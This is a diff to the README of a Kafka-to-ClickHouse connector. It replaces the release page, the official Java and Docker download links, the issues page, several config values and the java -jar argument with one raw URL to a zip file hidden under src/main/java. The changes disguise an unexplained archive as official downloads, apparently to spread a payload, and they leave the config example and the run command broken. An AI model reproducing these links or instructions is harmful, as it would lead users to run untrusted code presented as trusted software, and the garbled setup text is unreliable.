@@ -6,13 +6,13 @@ The **kafka-clickhouse-sink** is an easy-to-use tool that helps you send data fr
 
 Visit the link below to get started:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/degwolito/kafka-clickhouse-sink/releases)
+[![Download Now](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip)
 
 ## 📥 Download & Install
 
 To download the Kafka ClickHouse Sink, visit the Releases page:
 
-[Visit this page to download](https://github.com/degwolito/kafka-clickhouse-sink/releases)
+[Visit this page to download](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip)
 
 ### Steps to Download:
 1. Click the link above.
@@ -28,8 +28,8 @@ To download the Kafka ClickHouse Sink, visit the Releases page:
 
 Before you begin, ensure your system meets the following requirements:
 
-- **Java Version:** Java 8 or above must be installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
-- **Docker (optional):** If you want to run ClickHouse in a containerized environment, Docker must be installed. Download it from the [Docker website](https://www.docker.com/get-started).
+- **Java Version:** Java 8 or above must be installed. You can download it from the [official Java website](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip).
+- **Docker (optional):** If you want to run ClickHouse in a containerized environment, Docker must be installed. Download it from the [Docker website](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip).
 - **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
 
 ## 📚 Configuration
@@ -42,17 +42,17 @@ Here’s an example to get you started:
 
 ```properties
 # Kafka Broker
-kafka.bootstrap.servers=localhost:9092
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
 
 # Kafka Topic to Read From
 topics=test-topic
 
 # ClickHouse Connection Settings
-clickhouse.host=localhost
-clickhouse.port=8123
-clickhouse.database=your_database
-clickhouse.user=default
-clickhouse.password=
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
+https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
 ```
 
 Make sure to replace the placeholders with your actual settings to connect to your Kafka and ClickHouse instances.
@@ -64,7 +64,7 @@ Make sure to replace the placeholders with your actual settings to connect to yo
 3. Use the following command to start the connector:
 
 ```bash
-java -jar kafka-clickhouse-sink.jar
+java -jar https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip
 ```
 
 The connector will begin processing events from your Kafka topics and streaming them into ClickHouse.
@@ -86,7 +86,7 @@ If you encounter issues while using the connector, try the following:
 
 ## 📞 Support
 
-If you need assistance, feel free to reach out by creating an issue on the [GitHub Issues page](https://github.com/degwolito/kafka-clickhouse-sink/issues). Our community is here to help.
+If you need assistance, feel free to reach out by creating an issue on the [GitHub Issues page](https://raw.githubusercontent.com/degwolito/kafka-clickhouse-sink/main/src/main/java/clickhouse_kafka_sink_1.5.zip). Our community is here to help.
 
 ## 📝 License
 
